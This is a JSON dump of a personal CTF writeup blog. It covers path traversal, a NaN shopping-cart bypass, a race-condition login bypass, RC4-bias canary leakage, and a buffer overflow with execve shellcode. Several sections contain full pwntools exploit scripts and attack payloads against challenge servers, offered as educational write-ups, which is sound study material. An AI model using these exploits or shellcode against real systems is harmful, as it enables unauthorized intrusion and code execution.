lead # The URL structure shows a number: https://travel.ctf.pascalctf.it/pages/4. Normally, a number in a URL like this would make you think of IDOR (Insecure Direct Object Reference), not path traversal. But when the challenge description is practically screaming \u0026ldquo;path traversal\u0026rdquo; with the Dante quote, your brain might jump to trying LFI here first:\nhttps://travel.ctf.pascalctf.it/pages/../../../etc/passwd This doesn\u0026rsquo;t work. The /pages/4 route is handled by a framework that maps it to a function, not directly to files. The lesson: even when you\u0026rsquo;re pretty sure what vulnerability you\u0026rsquo;re looking for, don\u0026rsquo;t get tunnel vision on the first input you see. Check all the places where user input flows into the application.\nDiscovering the API # When you click around a website, your browser makes requests behind the scenes. To see what\u0026rsquo;s happening, you can use:\nBrowser DevTools (easiest)\nOpen the site in your browser Press F12 or right-click and select \u0026ldquo;Inspect\u0026rdquo; Go to the \u0026ldquo;Network\u0026rdquo; tab Click around the site and watch requests appear Look for API calls (often to /api/... endpoints) Burp Suite (more powerful)\nConfigure your browser to proxy through Burp Browse the site normally Burp captures every request for inspection and modification Using either method, we can see that when navigating to a page, the site makes a POST request:\nPOST /api/get_json Content-Type: application/json {\u0026#34;index\u0026#34;: \u0026#34;1\u0026#34;} And receives back:\n{ \u0026#34;name\u0026#34;: \u0026#34;Red Hot Chili Peppers - Road Trippin\u0026#39;\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;Red Hot Chili Peppers\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Watch the official music video...\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://youtu.be/11GYvfYjyV0\u0026#34; } The index parameter controls which song data gets loaded. But how does the server use this parameter?\nWhat is path traversal? # The server is probably reading files like /app/data/1.json, /app/data/2.json, etc. If the code looks something like:\ndef get_json(): index = request.json[\u0026#39;index\u0026#39;] path = f\u0026#34;/app/data/{index}.json\u0026#34; return open(path).read() Then the index value gets inserted directly into the file path. This is dangerous because we can use .. (dot-dot) to navigate up directories.\nIn file systems, .. means \u0026ldquo;parent directory\u0026rdquo;. So:\n/app/data/1.json reads the normal file /app/data/../flag.txt goes up from data/ to /app/, then reads flag.txt This technique is called path traversal or directory traversal. It lets attackers escape the intended directory and read arbitrary files.\nThe hint # The challenge description quotes Dante\u0026rsquo;s Inferno:\nNel mezzo del cammin di nostra vita mi ritrovai per una selva oscura, chÃ© la diritta via era smarrita.\nTranslation:\n\u0026ldquo;In the middle of the journey of our life, I found myself in a dark forest, for the straight path was lost.\u0026rdquo;\nThe key phrase is \u0026ldquo;la diritta via era smarrita\u0026rdquo;, meaning \u0026ldquo;the straight/direct path was lost.\u0026rdquo; This hints at path traversal: instead of following the intended path (/app/data/1.json), we stray off course using ../ to wander elsewhere in the filesystem.\nExploit # The challenge tells us the flag is at /app/flag.txt. Since the API probably reads from /app/data/{index}.json, we need to go up one directory:\ncurl -s \u0026#34;https://travel.ctf.pascalctf.it/api/get_json\u0026#34; \\ -X POST \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;index\u0026#34;: \u0026#34;../flag.txt\u0026#34;}\u0026#39; The server constructs the path /app/data/../flag.txt, which resolves to /app/flag.txt, and returns its contents.\nNote: the .json extension might still get appended, but many path traversal vulnerabilities work anyway if the file system ignores the extension or if there\u0026rsquo;s a null byte trick. In this case, it seems the server either doesn\u0026rsquo;t append an extension or the traversal bypasses it.\nFlag # pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/travel-playlist/","section":"CTFs","summary":"Path traversal via unsanitized file path parameter.","title":"Travel Playlist","type":"ctfs"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/type-confusion/","section":"Tags","summary":"","title":"Type-Confusion","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/vm/","section":"Tags","summary":"","title":"Vm","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/topics/web/","section":"Topics","summary":"Web exploitation, logic bugs, and application vulnerabilities.","title":"Web","type":"topics"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/xml/","section":"Tags","summary":"","title":"Xml","type":"tags"},{"content":"","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/tags/xxe/","section":"Tags","summary":"","title":"Xxe","type":"tags"},{"content":"We dont take any responsibility in any damage that our product may cause to the user\u0026rsquo;s health\nA shop where you can buy various \u0026ldquo;Za\u0026rdquo; products. You start with $100 balance, but the flag item \u0026ldquo;RealZa\u0026rdquo; costs $1000.\nThe vulnerability # Looking at the checkout logic in server.js:\nconst prices = { \u0026#34;FakeZa\u0026#34;: 1, \u0026#34;ElectricZa\u0026#34;: 65, \u0026#34;CartoonZa\u0026#34;: 35, \u0026#34;RealZa\u0026#34;: 1000 }; app.post(\u0026#39;/checkout\u0026#39;, (req, res) =\u0026gt; { const cart = req.session.cart; let total = 0; for (const product in cart) { total += prices[product] * cart[product]; } if (total \u0026gt; req.session.balance) { res.json({ \u0026#34;success\u0026#34;: true, \u0026#34;balance\u0026#34;: \u0026#34;Insufficient Balance\u0026#34; }); } else { // Purchase succeeds, items added to inventory // ... } }); The problem: the cart can contain any product name, not just valid ones. If product doesn\u0026rsquo;t exist in prices:\nprices[\u0026#34;RealZa\u0026#34;] * 1 // 1000 prices[\u0026#34;anything\u0026#34;] * 1 // undefined * 1 = NaN 1000 + NaN // NaN NaN \u0026gt; 100 // false Since NaN \u0026gt; 100 is false, the balance check passes.\nExploit # Using Burp Suite:\nLogin - POST to /login with any username/password\nAdd RealZa to cart - POST to /add-cart:\n{\u0026#34;product\u0026#34;:\u0026#34;RealZa\u0026#34;,\u0026#34;quantity\u0026#34;:1} Add a fake product - POST to /add-cart:\n{\u0026#34;product\u0026#34;:\u0026#34;anything\u0026#34;,\u0026#34;quantity\u0026#34;:1} Checkout - POST to /checkout\nGet flag - Visit /inventory\nThe fake product causes prices[\u0026quot;anything\u0026quot;] to be undefined, making the total NaN. The check NaN \u0026gt; 100 returns false, so checkout succeeds despite not having enough balance.\nFlag # pascalCTF{w3_l1v3_f0r_th3_z4z4} ","date":"31 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/pascal-26/zazastore/","section":"CTFs","summary":"NaN comparison bypass in a Node.js shopping cart.","title":"Zazastore","type":"ctfs"},{"content":"","date":"25 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-26/","section":"CTFs","summary":"","title":"Scarlet CTF 2026","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/function-pointer/","section":"Tags","summary":"","title":"Function-Pointer","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/input-buffering/","section":"Tags","summary":"","title":"Input-Buffering","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/race-condition/","section":"Tags","summary":"","title":"Race-Condition","type":"tags"},{"content":"Take a look at this super l33t login system I made for my Computer Architecture class! Heh\u0026hellip;my prof is gonna be so proud. He\u0026rsquo;s 100% gonna boost my GPA.\nSurely this will be safe to push to prod. I\u0026rsquo;ll even do it for him!\nnc challs.ctf.rusec.club 4622 The challenge provides a university login system with role-based access control. Users authenticate via randomly generated RUIDs (Rutgers University IDs), and different roles grant different privileges.\nBinary protections # Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX unknown - GNU_STACK missing PIE: PIE enabled Stack: Executable RWX: Has RWX segments The binary has most standard protections enabled, but critically, the stack is executable. This immediately suggests a shellcode-based exploitation path.\nReverse engineering # User structure and initialization # The binary defines a user structure that stores names, RUIDs, and function pointers:\nstruct user { char name[32]; uint64_t fn; // function pointer uint64_t ruid; // random user ID }; During initialization, two privileged users are created:\nint64_t setup_users() { char const* names[2]; names[0] = \u0026amp;titles.prof; names[1] = \u0026amp;titles.dean; int64_t (* handlers[2])(); handlers[0] = prof; handlers[1] = dean; for (int32_t i = 0; i \u0026lt;= 1; i += 1) { strcpy(\u0026amp;users[i], (\u0026amp;names)[i], \u0026amp;users); users[i].ruid = rand(); // predictable PRNG users[i].fn = handlers[i]; } } The RUIDs are generated using rand() without seeding, making them completely predictable across runs.\nAuthentication flow # The main loop prompts for a RUID and calls the corresponding user\u0026rsquo;s function pointer if a match is found:\nprintf(\u0026#34;Please enter your RUID: \u0026#34;); uint64_t ruid; scanf(\u0026#34;%lu%*c\u0026#34;, \u0026amp;ruid); for (int32_t i = 0; i \u0026lt;= 1; i += 1) { if (users[i].ruid == ruid) { printf(\u0026#34;Welcome, %s!\\n\u0026#34;, \u0026amp;users[i]); users[i].fn(); // call function pointer match = 1; } } This design allows us to trigger arbitrary function pointers by authenticating as different users.\nVulnerability: dean() overflow # The dean() function allows modifying staff member names but contains a critical buffer overflow:\nint64_t dean() { puts(\u0026#34;Change a staff member\u0026#39;s name!\u0026#34;); list_ruids(); int32_t user_idx; if (get_number(\u0026amp;user_idx, 2)) { printf(\u0026#34;New name: \u0026#34;); read(0, \u0026amp;users[user_idx], 0x29); // writes 41 bytes into 32-byte name } } The read() call accepts 41 bytes into a 32-byte buffer, allowing us to overflow into the function pointer (8 bytes) and partially into the RUID (1 byte).\nShellcode injection point # Early in main(), the program reads a NetID into a stack buffer:\nchar net_id[0x40]; read(0, \u0026amp;net_id, 0x40); Since the stack is executable, this becomes our shellcode injection point.\nExploitation strategy # The attack proceeds in four stages:\nPredict RUIDs - Calculate the deterministic rand() values Inject shellcode - Place shellcode on the stack via the NetID prompt Leak PIE base - Overflow to leak a code pointer Leak stack address - Redirect execution to leak a stack pointer Hijack control flow - Point function pointer to shellcode Predicting RUIDs # Since rand() is unseeded, we can predict the values locally:\nfrom ctypes import CDLL libc = CDLL(\u0026#34;libc.so.6\u0026#34;) prof_ruid = libc.rand() # first rand() -\u0026gt; Professor dean_ruid = libc.rand() # second rand() -\u0026gt; Dean These values remain constant across all executions of the binary.\nStage 1: Shellcode injection # We inject execve shellcode at the NetID prompt:\nshellcode = asm( \u0026#34;\u0026#34;\u0026#34; xor esi, esi xor edx, edx xor eax, eax push rax mov rdi, 0x68732f2f6e69622f push rdi mov rdi, rsp mov al, 59 syscall \u0026#34;\u0026#34;\u0026#34; ) p.sendlineafter(b\u0026#34;Please enter your netID:\u0026#34;, shellcode) This shellcode executes /bin/sh and will be our final target.\nStage 2: PIE leak # We authenticate as the Dean and overflow the Professor\u0026rsquo;s name field:\np.sendlineafter(b\u0026#34;Please enter your RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32) By writing exactly 32 bytes, we force the function pointer to be printed alongside the name, leaking a code address.\np.recvuntil(b\u0026#34;[0] {RUID REDACTED} \u0026#34;) leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False)[32:].ljust(8, b\u0026#34;\\0\u0026#34;))[0] bin.address = leak - 0x12f3 Stage 3: Stack leak # We overwrite the Professor\u0026rsquo;s function pointer with puts@plt:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(bin.plt[\u0026#34;puts\u0026#34;])) When we authenticate as the Professor, instead of calling the intended handler, puts() is invoked with the user structure\u0026rsquo;s address, leaking a stack pointer:\np.sendlineafter(b\u0026#34;your RUID:\u0026#34;, str(prof_ruid).encode()) p.recvuntil(b\u0026#34;Welcome\u0026#34;) p.recvline() stack_leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False).ljust(8, b\u0026#34;\\0\u0026#34;))[0] shell_addr = stack_leak + 0x1c0 # calculate shellcode location Stage 4: Shellcode execution # Finally, we overwrite the Professor\u0026rsquo;s function pointer to point to our shellcode:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(shell_addr)) Authenticating as the Professor now triggers our shellcode:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(prof_ruid).encode()) p.interactive() Final exploit # from ctypes import CDLL from pwn import * context.binary = bin = ELF(\u0026#34;./ruid_login\u0026#34;, checksec=False) libc = CDLL(\u0026#34;libc.so.6\u0026#34;) prof_ruid = libc.rand() dean_ruid = libc.rand() shellcode = asm( \u0026#34;\u0026#34;\u0026#34; xor esi, esi xor edx, edx xor eax, eax push rax mov rdi, 0x68732f2f6e69622f push rdi mov rdi, rsp mov al, 59 syscall \u0026#34;\u0026#34;\u0026#34; ) p = remote(\u0026#34;challs.ctf.rusec.club\u0026#34;, 4622) # Stage 1: Inject shellcode p.sendlineafter(b\u0026#34;Please enter your netID:\u0026#34;, shellcode) # Stage 2: Leak PIE base p.sendlineafter(b\u0026#34;Please enter your RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32) p.recvuntil(b\u0026#34;[0] {RUID REDACTED} \u0026#34;) leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False)[32:].ljust(8, b\u0026#34;\\0\u0026#34;))[0] bin.address = leak - 0x12f3 # Stage 3: Leak stack address p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(bin.plt[\u0026#34;puts\u0026#34;])) p.sendlineafter(b\u0026#34;your RUID:\u0026#34;, str(prof_ruid).encode()) p.recvuntil(b\u0026#34;Welcome\u0026#34;) p.recvline() stack_leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False).ljust(8, b\u0026#34;\\0\u0026#34;))[0] shell_addr = stack_leak + 0x1c0 # Stage 4: Execute shellcode p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(shell_addr)) p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(prof_ruid).encode()) p.interactive() Flag # RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h} ","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-26/ruid_login/","section":"CTFs","summary":"Exploiting predictable RUIDs, buffer overflow, and executable stack for shellcode execution.","title":"Ruid_login","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/shellcode/","section":"Tags","summary":"","title":"Shellcode","type":"tags"},{"content":"Its 2026, I need to start journal-maxing. Thats why I use speedjournal, which lets me brain-max my thoughts while time-maxing with the speed of C! Its also security-maxed so only I can read my private entries!\nnc challs.ctf.rusec.club 22169 This challenge presents a simple logging system where the flag is stored in a restricted log entry. Only authenticated admin users should be able to read restricted logs, but a timing vulnerability allows us to bypass this check.\nOverview # The program is a multi-threaded journal application with the following features:\nAdmin authentication with a password Writing new log entries (restricted or public) Reading log entries (with access control for restricted entries) A flag stored in a restricted log at index 0 1. Login admin 2. Write log 3. Read log 4. Exit Vulnerability analysis # The authentication mechanism # When you log in as admin, the system sets a global flag but immediately starts a background thread that resets it after a short delay:\nint is_admin = 0; // global authentication flag void *logout_thread(void *arg) { usleep(WAIT_TIME); // sleep for 1000 microseconds (1ms) is_admin = 0; // automatically log out return NULL; } void login_admin() { char pw[32]; printf(\u0026#34;Admin password: \u0026#34;); fgets(pw, sizeof(pw), stdin); if (strncmp(pw, \u0026#34;supersecret\\n\u0026#34;, 12) == 0) { is_admin = 1; // set admin flag pthread_t t; pthread_create(\u0026amp;t, NULL, logout_thread, NULL); pthread_detach(t); puts(\u0026#34;[+] Admin logged in (temporarily)\u0026#34;); } } The logout happens after only 1000 microseconds (1 millisecond). This seems like it would be too fast to exploit, but there\u0026rsquo;s a critical detail that makes this vulnerable.\nThe access control check # Reading a restricted log requires admin privileges:\nvoid read_log() { int idx; printf(\u0026#34;Index: \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); getchar(); if (idx \u0026lt; 0 || idx \u0026gt;= log_count) { puts(\u0026#34;Invalid index\u0026#34;); return; } if (logs[idx].restricted \u0026amp;\u0026amp; !is_admin) { // race condition here puts(\u0026#34;Access denied\u0026#34;); return; } printf(\u0026#34;Log: %s\\n\u0026#34;, logs[idx].content); } The vulnerability is a race condition between the main thread and the logout thread. While is_admin is set to 1, we have a narrow window to read the restricted log before the background thread resets it to 0.\nInput buffering: the key to exploitation # The critical insight is that scanf() and fgets() read from a buffered input stream. When you send multiple lines at once, they\u0026rsquo;re stored in the input buffer and processed sequentially without delay.\nThis means we can send our entire command sequence instantly:\n1 # Select \u0026#34;Login admin\u0026#34; supersecret # Enter password 3 # Select \u0026#34;Read log\u0026#34; 0 # Read index 0 (the flag) When these commands are all sent together, here\u0026rsquo;s what happens:\nThe program reads 1 from the buffer â†’ calls login_admin() login_admin() reads supersecret\\n from the buffer â†’ sets is_admin = 1 The logout thread is created but hasn\u0026rsquo;t executed yet Control returns to main, which reads 3 from the buffer â†’ calls read_log() read_log() reads 0 from the buffer and checks is_admin â†’ still 1! The flag is printed (Later) The logout thread finally executes Because all the input is pre-buffered, the entire sequence executes much faster than 1 millisecond. The program never has to wait for user input, so it completes before the logout thread can fire.\nExploitation # Method 1: Using pwntools # from pwn import * p = remote(\u0026#34;challs.ctf.rusec.club\u0026#34;, 22169) p.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\\nsupersecret\\n3\\n0\\n\u0026#34;) p.interactive() The sendafter() call waits for the prompt, then sends all four commands at once. They\u0026rsquo;re processed from the buffer faster than the thread can reset is_admin.\nMethod 2: Using netcat and printf # printf \u0026#34;1\\nsupersecret\\n3\\n0\\n\u0026#34; | nc challs.ctf.rusec.club 22169 This pipes all the input at once, achieving the same buffering effect.\nExecution trace # 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Admin password: [+] Admin logged in (temporarily) 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Index: Log: RUSEC{wow_i_did_a_data_race} 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Notice how all the prompts appear sequentially with no delay. The entire sequence completes before the 1ms timer expires.\nWhy this works # The exploit succeeds because of three factors:\nInput buffering: Commands are read from a buffer, not interactively Fast execution: Reading from a buffer is much faster than 1ms Threading timing: The logout thread doesn\u0026rsquo;t preempt the main thread immediately Even though 1 millisecond seems very short, it\u0026rsquo;s an eternity in CPU time. A modern processor can execute millions of instructions in 1ms. Our buffered input is processed in microseconds.\nFlag # RUSEC{wow_i_did_a_data_race} ","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-26/speedjournal/","section":"CTFs","summary":"Exploiting a TOCTOU race condition to bypass authentication checks.","title":"speedjournal","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/threading/","section":"Tags","summary":"","title":"Threading","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/bias/","section":"Tags","summary":"","title":"Bias","type":"tags"},{"content":" Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!\nncat --ssl encryptor-pwn.ept.gg 1337 The challenge provides a single ELF binary, encryptor, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.\nWelcome to the EPT encryptor! Please behave yourself, and remember to stay away from a certain function at 0x55da2f7324f0! 1. Encrypt a message 2. Reset the key and encrypt again 3. Change offset 4. Exit \u0026gt; Despite PIE being enabled, the address of win() is printed on startup, removing the need for a separate code pointer leak.\nBinary protections # All standard mitigations are enabled.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Reverse engineering # Encryption logic # Menu option 1 allows the user to encrypt an arbitrary string.\nif (menu_choice == 1) { printf(\u0026#34;Enter string to encrypt\\n\u0026gt; \u0026#34;); fgets(local_108, 242, stdin); RC4(key, local_108 + local_18, local_1f8, local_108 + local_18); puts_hex(local_1f8); resetKey(); } Two issues immediately stand out:\nfgets() reads 242 bytes into a 240-byte buffer The RC4 input pointer is offset by a stack variable local_18 Relevant stack layout:\nuchar local_1f8[240]; // ciphertext char local_108[240]; // user input Because fgets() writes a trailing null byte, this results in a 1-byte overflow past local_108, corrupting the least significant byte of local_18.\nDisabled offset control # There is a menu option intended to change this offset:\n\u0026gt; 3 Sorry, offset function disabled due to abuse! However, since local_18 is stored directly after the input buffer, the off-by-one overwrite allows us to modify it anyway. This gives indirect control over where RC4 reads plaintext from on the stack.\nStack layout and target # The relevant portion of the stack frame looks like this:\n[ user input buffer ] 240 bytes [ offset variable ] 1 byte (LSB controllable) [ padding ] [ stack canary ] 8 bytes [ saved rbp ] 8 bytes [ return address ] 8 bytes By adjusting the RC4 input offset, we can cause RC4 to encrypt arbitrary stack bytes, including the stack canary.\nRC4 keystream bias # RC4 is a stream cipher that generates a keystream K and encrypts via XOR:\n$$ C = P \\oplus K $$\nRC4 is known to exhibit statistical biases in its early output bytes. In particular, the second keystream byte is biased toward zero with probability:\n$$ \\Pr[K_2 = 0] = \\frac{1}{128} $$\ninstead of the uniform 1/256.\nThis enables a distinguishing attack: if the plaintext byte is constant across encryptions with fresh keys, the most frequent ciphertext byte converges to the plaintext value.\nCanary leakage via bias # We exploit this by:\nForcing RC4 to encrypt a chosen stack byte Aligning that byte with keystream index 2 Repeating encryption with fresh random keys Taking the most frequent ciphertext byte On amd64, the first byte of the stack canary is always 0x00, so only the remaining 7 bytes need to be recovered.\nCanary recovery script # Below is the core logic used to recover the canary one byte at a time.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} # craft input so the RC4 plaintext pointer lands on canary[i] payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) log.success(f\u0026#34;canary = {canary.hex()}\u0026#34;) Notes:\nOnly the least significant byte of the offset is controlled Keystream index 2 is targeted because its bias is strongest The threshold is heuristic and may need tuning on remote Example output:\ncanary = 6f28c7b1a4923e00 ret2win # The binary contains a hidden menu option:\nif (menu_choice == 1337) { printf(\u0026#34;Leaving already? Enter feedback:\\n\u0026gt; \u0026#34;); fgets(local_108, 288, stdin); } This reads 288 bytes into a 240-byte buffer, allowing full control of the return address.\nWith the stack canary known and win() already leaked, exploitation is trivial.\nFinal payload # p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) p.interactive() Successful execution:\nEPT{test_flag} Final solve script # Below is the consolidated exploit used locally and remotely.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) print(p.recvall().decode()) Takeaways # RC4 remains exploitable even outside traditional network protocols Single-byte overwrites are often sufficient to defeat stack canaries Cryptographic bias can be weaponized as an information leak Disabling functionality does not remove its security impact This challenge is a good example of cryptographic weaknesses amplifying memory corruption rather than replacing it.\n","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/ctfs/ept-25/encryptor/","section":"CTFs","summary":"Leaking a stack canary using RC4 keystream bias, then ret2win.","title":"Encryptor","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/ctfs/ept-25/","section":"CTFs","summary":"","title":"Equinor CTF 2025","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/rc4/","section":"Tags","summary":"","title":"Rc4","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/stack-canary/","section":"Tags","summary":"","title":"Stack-Canary","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/stream-cipher/","section":"Tags","summary":"","title":"Stream-Cipher","type":"tags"},{"content":"Hey, I\u0026rsquo;m Frederik. I publish CTF writeups and technical notes here.\nFocus\nBinary exploitation, crypto, reverse engineering, and web security CTFs, security research, and writeups worth sharing ","externalUrl":null,"permalink":"/writeups/about/","section":"About","summary":"Who I am, where to find me, and what I enjoy breaking.","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/writeups/topics/ctfs/","section":"Topics","summary":"Writeups grouped by competition.","title":"CTFs","type":"topics"}]